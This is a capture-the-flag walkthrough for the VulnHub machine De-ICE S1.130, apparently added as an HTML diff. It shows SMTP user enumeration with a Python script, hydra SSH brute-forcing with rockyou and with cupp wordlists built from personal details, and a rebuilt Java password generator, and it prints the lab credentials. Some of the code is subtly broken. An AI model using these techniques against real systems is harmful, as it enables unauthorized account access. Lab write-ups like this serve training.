@@ -1,0 +1,275 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the De-Ice S1.130 (Boot2Root Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-de-ice-s1-130-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-06-16T06:25:17+00:00">June 16, 2016</time><time class="updated" datetime="2025-06-10T20:13:21+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello and welcome readers to another CTF challenge De-ice s1.130. This is the third installment in the series of vulnerable machines in de-ice series. You can download de-ice from the official vulnhub repository <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/de-ice-s1130,11/">here</a></span>.</span></p>
+<p><span style="color: #000000;">The aim of this challenge is to get root and read the congratulatory flag.</span></p>
+<p><span style="color: #000000;"><strong>Difficulty Level</strong>: Intermediate</span></p>
+<p><span style="color: #000000;">A new penetration tester with raw skills might not be able to solve this lab since it also has some debugging of the algorithm, I would rate the level of this lab as <strong>intermediate.</strong></span></p>
+<h3><span style="color: #800000;">Steps involved:</span></h3>
+<ol>
+<li><span style="color: #000000;">IP grabbing</span></li>
+<li><span style="color: #000000;">Port scanning</span></li>
+<li><span style="color: #000000;">Setting up an SMTP listener to validate users</span></li>
+<li><span style="color: #000000;">Python scripting to enumerate the SMTP users</span></li>
+<li><span style="color: #000000;">Bruteforcing ssh using the username we grabbed</span></li>
+<li><span style="color: #000000;">Creating a custom wordlist using mail we read in csadmin to bruteforce sdadmin</span></li>
+<li><span style="color: #000000;">Creating a custom wordlist using mail we read in sdadmin to bruteforce dbadmin</span></li>
+<li><span style="color: #000000;">Adjoining part files in all 3 accounts</span></li>
+<li><span style="color: #000000;">Cleaning and debugging the algorithm using Java language</span></li>
+<li><span style="color: #000000;">Running the program to create a password for sysadmin</span></li>
+<li><span style="color: #000000;">Logging into root using su binary and nabbing the flag</span></li>
+</ol>
+<p><span style="color: #000000;">Let’s get started then!</span></p>
+<p><span style="color: #000000;">I found that the IP address of the lab was <strong>192.168.1.20 </strong>and my Kali had an IP <strong>192.168.1.108</strong></span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-VCaRMHE9pRU/W2fmfbKNM1I/AAAAAAAAZR0/pIoKO2KDUGYyeJ9Jx5I-lLkuH-CZbfxTwCLcBGAs/s1600/1.png"/></strong></span></p>
+<p><span style="color: #000000;">As usual, the first step was to scan the open ports using nmap. Nmap is the most popular tool used to scan for open ports. However, you can use another tool as well and it would work just as fine.</span></p>
+<pre class="lang:default decode:true">nmap –A 192.168.1.20</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-NcybDon2XtQ/W2fmiEkkNXI/AAAAAAAAZSg/0S7WfK_UvvEzQnhgSP4ULmHXKiEAEEDRgCLcBGAs/s1600/2.png"/></strong></span></p>
+<p><span style="color: #000000;">Without any delay, I moved on to the website since port 80 was open.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-OytexBtuRFM/W2fmkaR9ItI/AAAAAAAAZTI/0FQjsYSXykQql6Z582FYiHDySfpDe-KNgCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">I didn’t find anything good here and neither did <strong>Nikto </strong>tell me anything important.</span></p>
+<p><span style="color: #000000;">So, I clicked the link below and it opened another web page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-0_h14hIyIdY/W2fmk3NaBJI/AAAAAAAAZTY/84IBRvnRbic4JyU-tTJuddY8DWH_983lQCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">There was nothing useful here as well. But wait, we did find an email ID that could be related to the server user. So, I tried activating a netcat listener on SMTP.</span></p>
+<pre class="lang:default decode:true">nc –v 192.168.1.20 25</pre>
+<p><span style="color: #000000;"><strong>Rcpt to: kali</strong></span></p>
+<p><span style="color: #000000;">I tried a custom domain here as it required a mail from the tag.</span></p>
+<p><span style="color: #000000;"><strong>Mail from: kali@slax.example.net</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4s6xvpUnJr8/W2fmlJGlQNI/AAAAAAAAZTc/DcTOKqei8hMUMzmF-NyBDffW6vqExyEAACLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">But it did not work and neither did some other combination. But still, the connection wasn’t getting reset and it let me check the users, so I could generate permutations of users and hit them and see which one is a legal user!</span></p>
+<p><span style="color: #000000;">I made a python script that would enumerate the users easily. Save this as <strong>smtp_enum.py</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hV4BgnOIW_c/W2fmlVwAk6I/AAAAAAAAZTg/TBDT5FxEZfc_7f-PumTOjJkMKM_Od7fVgCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Code:</span></p>
+<pre class="lang:default decode:true">import sys
+filename = sys.argv[2]
+with open(filename) as f:
+&amp;nbsp;&amp;nbsp;&amp;nbsp; users = [line.strip() for line in f.readlines() if line]
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((sys.argv[1], 25))
+fn = s.makefile('rwb')
+fn.readline()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+fn.write('mail from: kali@slax.example.net \r\n')
+fn.flush()
+fn.readline()
+for user in users:
+&amp;nbsp;&amp;nbsp;&amp;nbsp; fn.write('rcpt to: %s\r\n' % user)
+&amp;nbsp;&amp;nbsp;&amp;nbsp; fn.flush()
+&amp;nbsp;&amp;nbsp;&amp;nbsp; print '%s: %s' % (user, fn.readline().strip())
+fn.write('QUIT\r\n')
+fn.flush()
+s.close()</pre>
+<p><span style="color: #000000;">(A huge shoutout to cyberry for this script. You can visit this website <a style="color: #000000;" href="https://www.cybrary.it/">here</a>)</span></p>
+<p><span style="color: #000000;"><strong>Inputs in the script: </strong>IP address of the victim</span></p>
+<p><span style="color: #000000;">We generated a list of usernames based on the permutations of the mail found: customerserviceadmin@nosecbank.com</span></p>
+<p><span style="color: #000000;">I created another script user-mutator.py that mutates the users but only using up to at max 3 options provided.</span></p>
+<p><span style="color: #000000;">For example, if the username is cservicea, follow that c-service-a are 3 different options.</span></p>
+<p><span style="color: #000000;">It will not generate a username, let’s say, csservicea (c-s-service-a)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-49WoVMaArjU/W2fmlW5ttoI/AAAAAAAAZTk/2R7Wke2MV9MPKPA7tRsbb_hW7YoIGT8uACLcBGAs/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Now, I ran this script and saved the results or output in a text file called <strong>userlist.txt</strong></span></p>
+<pre class="lang:default decode:true">cd Desktop
+python user-mutator.py &gt;&gt; userlist.py</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-yIWQm7CNYPM/W2fmlypOEsI/AAAAAAAAZTo/2q2fkrWLb8E9Inx7qhs9-Uh-3-IAdER2gCLcBGAs/s1600/8.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, I’ll run the script and append the output in a text file called matches.txt</span></p>
+<p><span style="color: #000000;">Mind you, this will append all the outputs regardless the user is right or not. Hence, I’ll use a grep filter to check the correct user.</span></p>
+<pre class="lang:default decode:true ">python smtp_enum.py 192.168.1.20 userlist.txt &gt;&gt; matches.txt
+cat matches.txt | grep "ok"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CFut8CUhzmI/W2fml29fmVI/AAAAAAAAZTs/1wWRVG-FUZYDFHbkfP5mZ5_hRrFIU2FIwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">It did the work! We found a user called csadmin. Now it’s time to bruteforce this using the password list rockyou.txt</span></p>
+<pre class="lang:default decode:true">hydra –l csadmin –P /usr/share/wordlists/rockyou.txt 192.168.1.20 ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ozakoSIOj4w/W2fmfg8ny0I/AAAAAAAAZR4/QwP_DDQnsMMenW72BeyjvVLNH9OWPdu2QCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">A password was found!</span></p>
+<p><span style="color: #000000;">Let’s log into ssh using this username and password.</span></p>
+<pre class="lang:default decode:true">ssh csadmin@192.168.1.20
+Password: rocker
+cd /home
+ls</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://4.bp.blogspot.com/-l0bLeHwLLnw/W2fmfj1DSUI/AAAAAAAAZR8/pUFvPyMLq6Q9RsQFKhs7T5rtTDPtqFhmQCLcBGAs/s1600/11.png"/></strong></span></p>
+<p><span style="color: #000000;">When I read the /etc/passwd file, I found a sysadmin user with escalated privileges. This could do the trick but right now we need to focus on the shell we just got.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Nc7AA_JFvRA/W2fmgISSQxI/AAAAAAAAZSA/F5n3ZH4NufcDNbVDuPQJKOlqWuEftGwcwCLcBGAs/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">I went back to the home directory and found a folder called <strong>mailserv_downloads</strong></span></p>
+<p><span style="color: #000000;">This had 2 messages or emails.</span></p>
+<p><span style="color: #000000;">I read the first one first.</span></p>
+<pre class="lang:default decode:true">cd
+ls
+cd mailserv_download/</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-5HaOrYTkT04/W2fmgAKiRtI/AAAAAAAAZSE/Mf94xplj8pkINuNgQSbN4hm7uaN4f6mYgCLcBGAs/s1600/13.png"/></strong></span></p>
+<p><span style="color: #000000;">I read the mail using the cat command</span></p>
+<pre class="lang:default decode:true">cat 2010122014234.j12Gqo4H049241</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://2.bp.blogspot.com/-b0wj1cz5w0s/W2fmgVzdLYI/AAAAAAAAZSI/zdwOsfhzsWIpc_1zckb43O-78rPNTr0ZACLcBGAs/s1600/14.png"/></strong></span></p>
+<p><span style="color: #000000;">It looked like an important mail since it mentioned a sender <strong>sdadmin. </strong>It also has details about <strong>sdadmin’s</strong></span></p>
+<p><span style="color: #000000;">Son’s birthday. If he kept his password simple, we could crack it using cupp and that’s what we did.</span></p>
+<p><span style="color: #000000;">But before that, I also examined the part file but as expected, it had nothing.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-SQV32cEsNFo/W2fmgp9jVII/AAAAAAAAZSM/B27-Owcm-GkQvF7KOS_M4wJZimHBS2XhACLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">Let’s make a custom dictionary using cupp now.</span></p>
+<pre class="lang:default decode:true">cupp –i</pre>
+<p><span style="color: #000000;">And fill the details as deemed in the mail.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VgXRdollXNg/W2fmgyRD9zI/AAAAAAAAZSQ/F384k0xKHS4vgz3K6ukQ4fZLKjUBsupnACLcBGAs/s1600/16.png"/></span></p>
+<p><span style="color: #000000;">The dictionary was saved in /home under the name of <strong>paul.txt</strong></span></p>
+<p><span style="color: #000000;">We copied it on desktop and bruteforce ssh using hydra.</span></p>
+<pre class="lang:default decode:true">hydra –l sdadmin –P /root/Desktop/paul.txt 192.168.1.20 22</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-K2wk8JDUAfc/W2fmgxyNWII/AAAAAAAAZSU/m0SWGUCHjjEW_EAX_joyxA5LKpMyVyr0wCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Voila! A password was found for sdadmin using the custom dictionary.</span></p>
+<p><span style="color: #000000;">Lets login to ssh using these credentials.</span></p>
+<pre class="lang:default decode:true">ssh sdadmin@192.168.1.20
+Password: donovin1998</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VkzWR94Ums4/W2fmhQmytVI/AAAAAAAAZSY/Wa8a-WaSRdYApBowIGPoa6T8wpIrmRIYQCLcBGAs/s1600/18.png"/></span></p>
+<p><span style="color: #000000;">It works! Let’s navigate for another piece of information in the home directory now.</span></p>
+<pre class="lang:default decode:true">id
+ls
+cd mailserv_download
+ls
+cat 2010122015043.j15Htu1H341102</pre>
+<p><span style="color: #000000;">Of course, there is another part file, part 3. This gives an idea that dbadmin might have the last missing piece. But before that, we need to steal dbadmin’s credentials.</span></p>
+<p><span style="color: #000000;">Can this mail help?</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-G421RSvppMw/W2fmh0pp9II/AAAAAAAAZSc/yAi9yt3A1GIXP6602upBlK4-brveJ4EOgCLcBGAs/s1600/19.png"/></strong></span></p>
+<p><span style="color: #000000;">This looked like a reply to a mail we read earlier. This mail also talked about a “<strong>databaser.</strong>” Right hand to god, this could be <strong>dbadmin</strong>. Hence, we created another custom dictionary using cupp to bruteforce <strong>dbadmin</strong>.</span></p>
+<pre class="lang:default decode:true">cupp -i</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R5KGTVZWk2Q/W2fmicWoHrI/AAAAAAAAZSk/d-me5H9j9wQ7K3_q7ZS3b_Pq4W6npvG9ACLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">The name was fred.txt this time. We again using bruteforce ssh using hydra.</span></p>
+<pre class="lang:default decode:true">hydra –l dbadmin –P /root/Desktop/fred.txt 192.168.1.20 ssh</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-N1XgTzR-xYY/W2fmiRIkaNI/AAAAAAAAZSo/kOWkw_y7X3AUSHkNd6_6UsonQ-1GG4SxACLcBGAs/s1600/21.png"/></strong></span></p>
+<p><span style="color: #000000;">A password was found!</span></p>
+<pre class="lang:default decode:true">dbadmin: databaser60</pre>
+<p><span style="color: #000000;">Lets login ssh using this credential.</span></p>
+<pre class="lang:default decode:true">id
+ls
+cd mailserv_download/
+ls</pre>
+<p><span style="color: #000000;">We finally found the last missing piece of the 3 part mail.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-t8rc2NkVzyY/W2fmi0UuY1I/AAAAAAAAZSs/9x2HWXI29a8YNJg7D0JnL-mTjmqrejXBACLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">I copied all these 3 mails into 3 separate text files on my local machine with names part1, part2, and part3.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-71_eI9MFaeg/W2fmjeqiiaI/AAAAAAAAZS0/SBsC919i0aU0ADF5S3hseetCoj4xg1qsgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">I concatenated all these 3 files into a single file complete.txt</span></p>
+<pre class="lang:default decode:true">cat part1.txt part2.txt part3.txt &gt;&gt; complete.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-k-0lX9gCho8/W2fmjFRKQcI/AAAAAAAAZSw/FyzVzRC30RY3-TA1rOyM5mQrwj-9uSUXACLcBGAs/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">But there were too many useless characters and lines.</span></p>
+<p><span style="color: #000000;">This step took way too much time than we can describe in the scope of this article since I cleaned extra spaces, tabs, characters, lines and made it readable but first of the many steps can be described as:</span></p>
+<pre class="lang:default decode:true">strings complete.txt | grep –v “ERROR:MESSAGE CORRUPTED” &gt;&gt; full</pre>
+<p><span style="color: #000000;">So on and so forth went the editing until the text file was readable:</span></p>
+<pre class="lang:default decode:true">cat full | sed “s/^[\t]*//” | grep –P ‘\t’ | sed “s/^[^0-9]*//”</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-tp2_p7l13S4/W2fmj-RIcvI/AAAAAAAAZS8/6KnbzdQvanQVdgmUoTjxqnhNYCdrk7YnQCLcBGAs/s1600/27.png"/></strong></span></p>
+<p><span style="color: #000000;">Hmm… This looked like an algorithm. Comments also cleared some of the info to complete all the dots together.</span></p>
+<p><span style="color: #000000;">Here is what we established:</span></p>
+<ol>
+<li><span style="color: #000000;">This is an algorithm which takes input the username and creates a password (1<sup>st</sup> comment says so)</span></li>
+<li><span style="color: #000000;">We could generate a password for sysadmin</span></li>
+</ol>
+<p><span style="color: #000000;">Hence, there was a need to create a program using the algorithm. I tried C, it was giving an error due to an unresolved issue, therefore I went back to cyberry’s blog (A huge shoutout to him again) and found his Java code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-O1bSA9c7GNQ/W2fmj0mBfnI/AAAAAAAAZTA/-JxPRdVmubsHWHSH-s-Rd7D5aoFte99lgCLcBGAs/s1600/28.png"/></span></p>
+<p><span style="color: #000000;">Quite a genius he is!</span></p>
+<p><span style="color: #000000;">Code:</span></p>
+<pre class="lang:default decode:true">import java.io.*;
+//import java.util.Arrays;
+public class s130fixed
+{
+public static void main(String[] args)
+{
+try
+System.out.println("Password Generator");
+BufferedReader in=new BufferedReader(new InputStreamReader(System.in));
+System.out.print("[?] Username: ");
+String input=in.readLine();
+int[] output=processLoop(input);
+//System.out.println("[+] Output: "+Arrays.toString(output));
+String outputASCII="";
+for(int i=0;i&lt;output.length;i++) outputASCII+=(char) output[i];
+System.out.println("[&gt;] Password: "+outputASCII);
+}
+catch(IOException e)
+{
+System.out.println("[-] IO Error!");
+}
+}
+/*input is username of account*/
+public static int[] processLoop(String input){
+int strL=input.length();
+int lChar=(int)input.charAt(strL-1);
+int fChar=(int)input.charAt(0);
+int[] encArr=new int[strL+2];
+encArr[0]=(int)lChar;
+for(int i=1;i&lt;strL+1;i++) encArr[i]=(int)input.charAt(i-1);
+encArr[encArr.length-1]=(int)fChar;
+encArr=backLoop(encArr);
+encArr=loopBack(encArr);
+encArr=loopProcess(encArr);
+int j=encArr.length-1;
+for(int i=0;i&lt;encArr.length;i++){
+if(i==j) break;
+int t=encArr[i];
+encArr[i]=encArr[j];
+encArr[j]=t;
+j--;
+}
+return encArr;
+}
+/*Note the pseudocode will be implemented with the
+root account and my account, we still need to implement it with the csadmin, sdadmin,
+and dbadmin accounts though*/
+public static int[] backLoop(int[] input){
+int ref=input.length;
+int a=input[1];
+int b=input[ref-1];
+int ch=(a+b)/2;
+for(int i=0;i&lt;ref;i++){
+if(i%2==0) input[i]=(input[i]%ch)+(ref+i);
+else input[i]=(input[i]+ref+i);
+}
+return input;
+}
+public static int[] loopBack(int[] input){
+int ref=input.length/2;
+int[] encNew=new int[input.length+ref];
+int ch=0;
+for(int i=(ref/2);i&lt;input.length;i++){
+encNew[i]=input[ch];
+ch++;
+}
+for(int i=0;i&lt;encNew.length;i++){
+if(encNew[i]&lt;=33) encNew[i]=33+(++ref*2);
+else if(encNew[i]&gt;=126) encNew[i]=126-(--ref*2);
+else{
+if(i%2==0) encNew[i]-=(i%3);
+else encNew[i]+=(i%2);
+}
+}
+return encNew;
+}
+public static int[] loopProcess(int[] input){
+for(int i=0;i&lt;input.length;i++){
+if(input[i]==40||input[i]==41) input[i]+=input.length;
+else if(input[i]==45) input[i]+=20+i;
+}
+return input;
+}
+}</pre>
+<p><img decoding="async" style="color: #000000;" src="https://2.bp.blogspot.com/-JHtFkgzX0t0/W2fmkHqJI5I/AAAAAAAAZTE/F7ylKmVFb3QO0_YO_YDi5OAcjFxYXXHVQCLcBGAs/s1600/29.png"/></p>
+<p><span style="color: #000000;">The final dot:</span></p>
+<p><span style="color: #000000;">“Pseudocode will be implemented with the root account and my account.”</span></p>
+<p><span style="color: #000000;">My account seems like <strong>sysadmin </strong>talking.</span></p>
+<p><span style="color: #000000;">Let us compile this Java code using <strong>javac.</strong></span></p>
+<pre class="lang:default decode:true">javac program.java</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-UDFeRZWqk_k/W2fmkRGghjI/AAAAAAAAZTM/9noCEJqMHzIQMI_xjL-Xm5-sK9fz6L3fgCLcBGAs/s1600/30.png"/></strong></span></p>
+<p><span style="color: #000000;">Execute this using :</span></p>
+<pre class="lang:default decode:true">java program</pre>
+<p><span style="color: #000000;">As stated, we input sysadmin as the username and it gave us a password. It gave a password for root as well but it didn’t work.</span></p>
+<pre class="lang:default decode:true">ssh sysadmin@192.168.1.20
+Generated password: 7531/{{tor/rv/A</pre>
+<p><span style="color: #000000;"><strong> </strong><img decoding="async" src="https://3.bp.blogspot.com/-jZexDarqhXA/W2fmksgI-6I/AAAAAAAAZTQ/1XKpygiEMC8_buZS-BfsNzJiae9hJXpTACLcBGAs/s1600/31.png"/></span></p>
+<p><span style="color: #000000;">Hence, we got into the sysadmin shell!</span></p>
+<p><span style="color: #000000;">We tried <strong>su</strong> here and it prompted for a password.</span></p>
+<p><span style="color: #000000;">Upon entering the system generated password, we got into root!!</span></p>
+<p><span style="color: #000000;">Final steps:</span></p>
+<pre class="lang:default decode:true">ls
+cat Note_to_self</pre>
+<p><span style="color: #000000;">Hence, the flag was nabbed! Hope you enjoyed this!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YtUcH2ALG8o/W2fmk1ULXkI/AAAAAAAAZTU/IwNkb32qHfk4oIMuMnOvVmL09w_j8FmfQCLcBGAs/s1600/32.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contact<strong> <a class="broken_link" style="color: #000000;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
